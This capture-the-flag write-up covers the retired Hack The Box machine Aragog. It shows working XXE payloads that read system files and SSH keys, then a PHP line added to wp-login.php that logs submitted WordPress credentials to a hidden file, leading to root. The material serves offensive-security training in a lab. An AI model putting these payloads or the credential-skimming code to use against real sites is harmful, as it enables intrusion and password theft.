# Aragog

This is the write-up for the box Aragog that got retired at the 21st July 2018.
My IP address was 10.10.14.34 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.78    aragog.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/aragog.nmap 10.10.10.78
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking FTP (Port 21)

As anonymous login on FTP is allowed, lets download the _test.txt_ and look at the contents:
```xml
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

This does not give any information about the box but it could be a hint because it is in **XML** format.

## Checking HTTP (Port 80)

On the web page there is the Apache2 default page, so lets look for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.78 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It finds _hosts.php_ where it says one sentence:
> There are 4294967294 possible hosts for

Sending it to a proxy like **Burpsuite** and trying out if it accepts data by changing the HTTP request to _POST_ and appending something at the end of the request. As we got data from the file on FTP in XML format, appending that seems like the way to go:
```markdown
POST /hosts.php HTTP/1.1
Host: 10.10.10.78
()...)

<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

Now it shows another response from the web service:
> There are 62 possible hosts for 255.255.255.192

So this application is a subnet calculator that reads XML files.
One way to attack XML is with **XML External Entities** or in short **XXE**.

### Analyzing the XXE

Before exploiting the XXE, we should test for it with this basic XML string:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Test"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

Now the string between the _subnet_mask_ tag gets replaced by the variable _&example_ whose value is _Test_ and the response becomes:
> There are 4294967294 possible hosts for Test

With this method it is possible to retrieve system files with the _SYSTEM_ command:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

This displays the contents of the _/etc/passwd_ file.
There are two non-default users on the box that could be useful later called _cliff_ and _florian_.

Also interesting is the content of the _hosts.php_.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

This outputs the contents of the file in _Base64_ which can be decoded to read the source code:
```markdown
echo PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo= | base64 -d > hosts.php
```

The source code reveals that it is possible to load **DTD files** which can be used to gain code execution with XML.
For this to work, we need to find a way to create such a file on the system.

As there is no way to do that, lets look for a **Local File Inclusion** to search for sensitive files.

### Looking for LFI

The [LFISuite](https://github.com/D35m0nd142/LFISuite) has tools and lists to automatically search for LFI.
I will only use the _pathtotest.txt_ file as the wordlist and include some directories that can be found in user directories for example _/.ssh/id_rsa_ and _/.bash_history_.

Now writing a Python script that can be found in this repository to automate the process:
```markdown
python aragog_lfi.py
```

This grabs the home directories out of the _/etc/passwd_ file and tries to get the contents of files specified in the wordlist to input them into the XXE vulnerability. The results are the contents of _/home/florian/.ssh/id_rsa_ and _/home/florian/.bash_history_.

The _id_rsa_ file is a private SSH key which can be copied to use the key ourselves to log into the box as the user _florian_:
```markdown
chmod 600 id_rsa_florian

ssh -i id_rsa_florian florian@10.10.10.78
```

## Privilege Escalation

Now we are logged in on the box as _florian_ and need to look for an attack surface for higher privileges.
Lets run any **Linux Enumeration script** to get information about the box:
```markdown
wget 10.10.14.34/LinEnum.sh

bash LinEnum.sh
```

After analyzing it, there seems to be another directory on the web server named _/dev_wiki_.
This path forwards us to a **WordPress blog page** with one article that says:
```markdown
Hi Florian,

Thought we could use a wiki.  Feel free to log in and have a poke around – but as I’m messing about with a lot of changes I’ll probably be restoring the site from backup fairly frequently!

I’ll be logging in regularly and will email the wider team when I need some more testers.

Cliff
```

The fact that _cliff_ logs in regularly is a hint, that this user needs to be attacked.
As everyone has read permissions on the _/var/www/html/dev_wiki/_ directory, it is possible to get the database password out of the _wp-config.php_ file:
```markdown
define('DB_NAME', 'wp_wiki');
define('DB_USER', 'root');
define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');
define('DB_HOST', 'localhost');
```

This password works on the **MySQL** instance:
```markdown
mysql -u root -p

use wp_wiki;
select * from wp_users;
```

This gets the hashed password for the **WordPress** user _Administrator_:
```markdown
+----+---------------+------------------------------------+---------------+
| ID | user_login    | user_pass                          | user_nicename |
+----+---------------+------------------------------------+---------------+
|  1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | administrator |
+----+---------------+------------------------------------+---------------+
```

The _/dev_wiki_ directory updates his date regularly, so this means that a cronjob is doing something with it.
It seems like it gets backed up into the directory _/var/www/html/zz_backup_ every five minutes.

Instead of trying to crack the gathered password, we modify the _wp-login_ configuration in WordPress to send the credentials into another file when someone logs in.
To do that, appending the following code on line 843 in the configuration will do the trick:
```php
// (...)
841 case 'login' :
842 default:
843         file_put_contents(".Testing", $\_POST['log'] . ":" . $\_POST['pwd'] . "\n", FILE_APPEND);
844         $secure_cookie = '';
845         $customize_login = isset( $\_REQUEST['customize-login'] );
// (...)
```

Now when _cliff_ logs in, the credentials will be forwarded into the file _.Testing_ in the same directory.
After waiting for a while, the user logs in as _Administrator_ and the password gets written into the file:
```markdown
Administrator:!KRgYs(JFO!&MTr)lf
```

If we try this password to switch user to root it also works!
```markdown
su - root
```
